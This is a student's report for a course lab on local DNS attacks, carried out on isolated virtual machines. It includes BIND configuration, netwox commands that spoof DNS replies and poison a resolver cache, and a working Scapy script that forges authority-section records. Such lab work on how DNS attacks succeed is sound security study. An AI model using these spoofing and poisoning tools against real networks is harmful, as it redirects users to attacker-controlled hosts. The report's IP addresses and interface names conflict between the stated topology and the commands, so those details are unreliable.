# COSC434/534 Lab 1: Local DNS Attack Lab Report

**Date**: February 18, 2026  
**Environment**: SEED Ubuntu VM, VirtualBox  
**Topology**:

- User VM: 10.10.0.12 (NAT Network, enp0s3)
- DNS Server VM: 10.10.0.13 (NAT Network, enp0s3)
- Attacker VM: 10.10.0.11 (NAT Network, enp0s3)

**VirtualBox settings (all VMs):**

- Adapter 1: NAT Network (10.10.0.0/24)
- Promiscuous Mode: Allow All

---

## Task 1: Configure User Machine to Use Local DNS

**Goal**: Force the user VM to use the local DNS server VM.

**Commands** (User VM):

```bash
sudo nano /etc/resolvconf/resolv.conf.d/head
sudo resolvconf -u
cat /etc/resolv.conf
```

**Verification**:

```bash
dig www.google.com
```

**Observation**: The resolver config shows multiple nameservers (`192.168.56.104`, `10.10.0.13`, and `127.0.1.1`). The `dig` output reports `SERVER: 10.10.0.13#53`, confirming the local DNS server handled the query.

**Screenshot**: include `cat /etc/resolv.conf` (showing both `192.168.56.104` and `10.10.0.13`) and `dig` output showing `SERVER: 10.10.0.13#53`.

---

## Task 2: Configure Local DNS Server (BIND 9)

**Goal**: Configure BIND and disable DNSSEC for attack demonstrations.

**Key configuration** (`/etc/bind/named.conf.options`):

```conf
options {
    dump-file "/var/cache/bind/dump.db";
    # dnssec-validation auto;
    dnssec-enable no;
    directory "/var/cache/bind";
};
```

**Commands** (User VM):

```bash
ping -c 2 www.google.com
ping -c 2 www.google.com
```

**Observation**: The first and second pings resolve successfully, indicating DNS resolution and caching are working. The resolved IP changed between runs, which is normal due to multiple Google A records.

**Screenshot**: include both `ping -c 2` outputs and Wireshark DNS capture showing the initial DNS query.

---

## Task 3: Host a Zone in the Local DNS Server

**Goal**: Serve `example.com` and reverse lookup records locally.

**Zone definitions** (`/etc/bind/named.conf`):

```conf
zone "example.com" {
    type master;
    file "/etc/bind/example.com.db";
};
zone "0.168.192.in-addr.arpa" {
    type master;
    file "/etc/bind/192.168.0.db";
};
```

**Forward zone** (`/etc/bind/example.com.db`):

```conf
$TTL 3D
@ IN SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
@ IN NS ns.example.com.
@ IN MX 10 mail.example.com.
www IN A 192.168.0.101
mail IN A 192.168.0.102
ns IN A 192.168.0.10
*.example.com. IN A 192.168.0.100
```

**Reverse zone** (`/etc/bind/192.168.0.db`):

```conf
$TTL 3D
@ IN SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
@ IN NS ns.example.com.
101 IN PTR www.example.com.
102 IN PTR mail.example.com.
10 IN PTR ns.example.com.
```

**Verification** (User VM):

```bash
dig www.example.com
```

**Observation**: The response is authoritative (`aa` flag) and maps `www.example.com` to `192.168.0.101` from the local DNS server `10.10.0.13`.

**Screenshots**:

- `dig www.example.com` showing `A 192.168.0.101` and `SERVER: 10.10.0.13#53`

---

## Task 4: Modify Hosts File

**Goal**: Demonstrate local name override via `/etc/hosts`.

**Commands** (User VM):

```bash
ping -c 2 www.bank32.com
sudo nano /etc/hosts
# Add: 1.2.3.4 www.bank32.com
ping -c 2 www.bank32.com
dig www.bank32.com
```

**Observation**: `ping` resolves to `1.2.3.4` after edit, but `dig` still uses DNS and ignores `/etc/hosts`.

**Screenshot**: before/after `ping`, plus `dig` showing DNS unaffected.

---

## Task 5: Direct Spoofing to User

**Goal**: Spoof DNS reply directly to the user’s query.

**Attacker VM**:

```bash
sudo netwox 105 -h "www.example.net" -H 1.2.3.4 -a "ns.example.net" \
  -A 192.168.56.104 -d enp0s3 -T 600 \
  -f "udp and src host 192.168.56.101 and dst host 192.168.56.104 and dst port 53" \
  -s raw
```

**User VM**:

```bash
dig www.example.net
```

**Observation**: The answer section shows `1.2.3.4`, proving the spoofed reply was accepted.

**Screenshot**: netwox running + `dig` output showing fake IP.

---

## Task 6: DNS Cache Poisoning (Server)

**Goal**: Poison the DNS server’s cache so it serves forged answers later.

**DNS Server VM**:

```bash
sudo rndc flush
```

**Attacker VM** (NAT network on enp0s8):

```bash
sudo netwox 105 -h "p4g77.example.net" -H 1.2.3.4 -a "ns.example.net" \
  -A 192.168.56.104 -d enp0s8 -T 600 \
  -f "udp and src host 10.10.0.9 and dst port 53" -s raw
```

**User VM**:

```bash
dig p4g77.example.net
```

**Observation**: The DNS server replies with `1.2.3.4` for the poisoned hostname, showing cache poisoning success.

**Screenshot**: netwox output + `dig` output showing `1.2.3.4`.

---

## Task 7: Authority-Section Poisoning (Scapy)

**Goal**: Poison the DNS server to use an attacker-controlled nameserver for all `example.net` hosts.

**Attacker VM (Scapy script)**: `/home/seed/poison_auth.py`

```python
from scapy.all import *

def spoof_dns(pkt):
    if DNS in pkt and pkt[DNS].qd:
        qname = pkt[DNS].qd.qname
        if isinstance(qname, bytes):
            qname = qname.decode()
        if "example.net" in qname:
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            ans = DNSRR(rrname=qname, type="A", ttl=600, rdata="1.2.3.4")
            ns = DNSRR(rrname="example.net", type="NS", ttl=600, rdata="attacker.local")
            ar = DNSRR(rrname="attacker.local", type="A", ttl=600, rdata="192.168.56.105")
            dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                      qdcount=1, ancount=1, nscount=1, arcount=1,
                      an=ans, ns=ns, ar=ar)
            send(ip/udp/dns, verbose=0)

sniff(iface="enp0s8",
      filter="udp and src 10.10.0.9 and dst port 53",
      prn=spoof_dns, store=False)
```

**User VM**:

```bash
dig z9k11.example.net
```

**DNS Server VM**:

```bash
sudo rndc dumpdb -cache
sudo cat /var/cache/bind/dump.db | grep -A 3 "example.net.*NS"
```

**Observation**:

- `dig` shows `z9k11.example.net` resolves to `1.2.3.4`.
- AUTHORITY section shows `example.net IN NS attacker.local`.
- Cache dump contains `example.net. NS attacker.local.`

**Screenshots**: Scapy output + `dig` output + cache dump.

---

## Overall Observations

- Local DNS configuration and authoritative zones are easy to control and verify with `dig`.
- Direct spoofing to the user (Task 5) is effective if the attacker can sniff traffic.
- Cache poisoning (Task 6) requires the attacker to see outbound DNS queries on the NAT network.
- Authority-section poisoning (Task 7) allows control over all hosts in the target domain.

---

## Screenshot Checklist

- Task 1: `dig` using local DNS (SERVER: 192.168.56.104)
- Task 2: BIND restart and cache control
- Task 3: Forward and reverse `dig` outputs
- Task 4: `/etc/hosts` override (ping vs dig)
- Task 5: netwox output + spoofed `dig`
- Task 6: netwox output + poisoned `dig`
- Task 7: Scapy output + poisoned `dig` + cache dump
